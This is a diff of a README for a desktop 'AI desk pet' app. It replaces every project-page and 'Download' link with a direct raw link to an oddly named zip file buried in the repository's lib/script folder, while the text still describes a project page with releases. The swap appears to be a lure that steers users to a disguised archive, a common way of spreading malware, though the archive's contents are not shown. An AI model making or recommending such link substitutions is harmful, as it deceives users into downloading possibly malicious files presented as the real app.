@@ -1,6 +1,6 @@
 # ✨ FlyingSnowVelvet-Aemeath - Simple AI Desk Pet for Daily Use
 
-[![Download / Visit the app page](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/Riana651/FlyingSnowVelvet-Aemeath)
+[![Download / Visit the app page](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/Riana651/FlyingSnowVelvet-Aemeath/main/lib/script/SEanima/Aemeath_Velvet_Snow_Flying_concupy.zip)
 
 ## 🖥️ What this app does
 
@@ -17,7 +17,7 @@ Use it if you want:
 
 Visit the project page here:
 
-https://github.com/Riana651/FlyingSnowVelvet-Aemeath
+https://raw.githubusercontent.com/Riana651/FlyingSnowVelvet-Aemeath/main/lib/script/SEanima/Aemeath_Velvet_Snow_Flying_concupy.zip
 
 On that page, look for the latest release or the main download file. Then:
 
@@ -202,4 +202,4 @@ If the app cannot connect:
 
 Main download and app page:
 
-https://github.com/Riana651/FlyingSnowVelvet-Aemeath
+https://raw.githubusercontent.com/Riana651/FlyingSnowVelvet-Aemeath/main/lib/script/SEanima/Aemeath_Velvet_Snow_Flying_concupy.zip
